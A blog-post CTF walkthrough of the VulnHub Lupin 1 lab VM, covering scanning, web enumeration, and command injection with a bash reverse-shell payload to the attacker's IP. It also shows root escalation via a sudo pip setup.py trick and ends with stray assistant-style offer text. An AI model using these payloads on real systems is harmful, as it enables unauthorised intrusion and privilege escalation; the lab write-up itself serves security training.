---
title: "Lupin 1 — VulnHub CTF Walkthrough"
date: 2025-11-08
author: shivam
categories:
  - ctf
  - vulnhub
  - writeup
tags:
  - Lupin
  - VulnHub
  - walkthrough
  - boot2root
summary: "Step-by-step walkthrough for Lupin 1 (VulnHub) — discovery, enumeration, exploitation and privilege escalation with screenshots. Chirpy-compatible."
image:
  path: /assets/img/vulnhub/Lupin_1/1761297704364.jpg
  alt: "Lupin 1 — Recon / nmap"
---

# Lupin 1 — VulnHub (Walkthrough)

**Goal:** fully compromise the Lupin 1 VM (initial access → root).  
**Author:** Shivam  
**Completed on:** 2025-11-08

> This writeup documents a lab-only path. Only perform these steps against machines you own or have explicit permission to test.

---

## Table of contents

1. [Lab setup & notes](#lab-setup--notes)  
2. [Recon — find the target](#recon---find-the-target)  
3. [Port & service enumeration (nmap)](#port--service-enumeration-nmap)  
4. [Web & application enumeration](#web--application-enumeration)  
5. [Initial access (exploit / shell)](#initial-access-exploit--shell)  
6. [Post-exploit enumeration & privilege escalation](#post-exploit-enumeration--privilege-escalation)  
7. [Proof, cleanup & lessons learned](#proof-cleanup--lessons-learned)  

---

## Lab setup & notes {#lab-setup--notes}

**Environment**

* Attacker: Kali Linux VM (examples use `192.168.120.132`).  
* Target: Lupin 1 (VulnHub) VM.  
* Networking: host-only / NAT (same subnet).  
* Always snapshot the target VM before testing.

---

## Recon — find the target {#recon---find-the-target}

Discover hosts on your lab network and identify the Lupin VM IP:

```bash
# quick network sweep (adjust subnet)
netdiscover -r 192.168.120.0/24
# or
arp-scan --localnet


Once you locate the target IP (examples below use `192.168.120.139`) proceed to scanning.

**Image — target console / banner:**
![Lupin console banner]({{ '/assets/img/vulnhub/Lupin_1/1761297690770.jpg' | relative_url }})

---

## Port & service enumeration (nmap) {#port--service-enumeration-nmap}

A full nmap scan uncovers services and versions to guide exploit selection:

```bash
nmap -sV -O -T4 192.168.120.139 -oN scans/lupin_nmap.txt
```

Typical relevant ports found on Lupin 1 (example output):

```
22/tcp   open  ssh       OpenSSH 8.x
80/tcp   open  http      Apache httpd (various)
631/tcp  open  ipp       CUPS
# other ports may appear depending on VM build
```

**Image — nmap output:**
![nmap output]({{ '/assets/img/vulnhub/Lupin_1/1761297707859.jpg' | relative_url }})

Save this output; service versions are your primary clues for further work.

---

## Web & application enumeration {#web--application-enumeration}

Web apps are often the quickest route. Combine manual browsing with automatic discovery:

```bash
# directory brute-forcing
gobuster dir -u http://192.168.120.139 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o scans/gobuster_lupin.txt

# quick vulnerability scan
nikto -h http://192.168.120.139 -o scans/nikto_lupin.txt
```

Manual inspection tips:

* Open `http://$TARGET/` and browse any links (gallery, admin pages, tools).
* Intercept requests with Burp Suite to test GET/POST parameters.
* Search for scripts that call `system()`/`exec()` (ping utilities, file viewers) or for uploaded files / backups.

**Image — web panel / ping/admin UI:**
![web admin / ping]({{ '/assets/img/vulnhub/Lupin_1/1761297709490.jpg' | relative_url }})

Look for pages that reflect input back to the response — these often indicate command-injection or RCE opportunities.

---

## Initial access (exploit / shell) {#initial-access-exploit--shell}

From enumeration you may find either:

* A **command injection** (ping/admin form), or
* A **vulnerable service/CMS** with a known exploit.

### Example: command injection via ping form

1. Confirm the form executes server-side commands by injecting a harmless marker:

```
127.0.0.1; echo LUPINTEST
```

If `LUPINTEST` appears in the response, the parameter is injectable.

2. Get a reverse shell:

On the attacker:

```bash
nc -lvnp 4444
```

In the vulnerable parameter (careful with quoting and web app filtering):

```
127.0.0.1; /bin/bash -i >& /dev/tcp/192.168.120.132/4444 0>&1 ;
```

3. Upgrade the shell once you connect:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
python -c 'import pty; pty.spawn("/bin/sh")'
```

**Image — initial shell / whoami (example):**
![initial shell proof]({{ '/assets/img/vulnhub/Lupin_1/1761297701561.jpg' | relative_url }})

### Example: exploit via known PoC / SearchSploit

If a service version maps to an exploit:

```bash
searchsploit <service> <version>
# or examine Exploit-DB manually
```

If a PoC requires compiling on the target, transfer the C file and compile:

```bash
# on target
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

(Example images of compiling & running a PoC are included below.)

**Image — compile/run exploit (example):**
![compile exploit]({{ '/assets/img/vulnhub/Lupin_1/1761297706655.jpg' | relative_url }})

---

## Post-exploit enumeration & privilege escalation {#post-exploit-enumeration--privilege-escalation}

Once you have a shell (low privilege), perform methodical enumeration to find escalation vectors.

### Basic enumeration

```bash
id
whoami
uname -a
cat /etc/os-release
ps aux --no-heading | head -n 40
sudo -l
```

**Image — sudo allowed commands & quick escalation (example):**
![sudo list and escalation]({{ '/assets/img/vulnhub/Lupin_1/1761297715644.jpg' | relative_url }})

If `sudo -l` shows a program you can run as root without a password (NOPASSWD), abuse that. Example exploitation patterns used on Lupin-style VMs:

* `sudo` allows running `pip`/`python` as root — create a malicious `setup.py` / small python script to spawn a root shell.
* Writable scripts run by root via cron — replace them or inject payloads.
* SUID binaries that can be abused to execute `/bin/sh`.

### Example: abusing sudo pip (pattern)

If `sudo -l` lists `NOPASSWD: /usr/bin/pip` for user `arsene`:

1. Create a temporary directory on the target:

```bash
TF=$(mktemp -d)
cat > $TF/setup.py <<'PY'
import os,sys
os.execv('/bin/sh', ['/bin/sh', '-c', 'exec 0</dev/tty 1>/dev/tty 2>/dev/tty'])
PY
```

2. Run `sudo pip install $TF` which will execute `setup.py` as root. That spawns a root shell.

**Image — root proof (id -> uid=0):**
![root proof]({{ '/assets/img/vulnhub/Lupin_1/1761297696251.jpg' | relative_url }})

(Exact commands will vary per VM; use the results of `sudo -l` and file permissions to craft an exploit.)

---

## Proof, cleanup & lessons learned {#proof-cleanup--lessons-learned}

### Proof

Collect non-sensitive proof:

```bash
whoami
id
cat /root/root.txt 2>/dev/null || ls -la /root
```

**Image — root banner / root.txt ascii art (example):**
![root flag / ASCII art]({{ '/assets/img/vulnhub/Lupin_1/1761297718432.jpg' | relative_url }})

### Cleanup (lab-only)

* Remove any uploaded payloads.
* Revert the VM to a fresh snapshot.
* Document the exploit, commands, and lessons learned for future reference.

### Lessons learned

* `sudo -l` remains one of the most valuable commands after initial access.
* Web-based command injection often leads to low-priv shells that can be escalated if `sudo` is misconfigured.
* Always validate exploit applicability (version, architecture) before running PoCs.

---

## Quick commands summary

```bash
# discover
netdiscover -r 192.168.120.0/24

# recon
nmap -sV -O -T4 192.168.120.139 -oN scans/lupin_nmap.txt

# web enumeration
gobuster dir -u http://192.168.120.139 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -o scans/gobuster_lupin.txt
nikto -h http://192.168.120.139 -o scans/nikto_lupin.txt

# listener for reverse shell
nc -lvnp 4444

# post-shell enumeration
id; whoami; sudo -l; find / -perm -4000 -type f 2>/dev/null | sort
```

---


* paste this as a ready-to-save `_posts/YYYY-MM-DD-lupin1.md` file, or
* generate a `sed` snippet that inserts the image `relative_url` references into your existing draft. Which would you like?
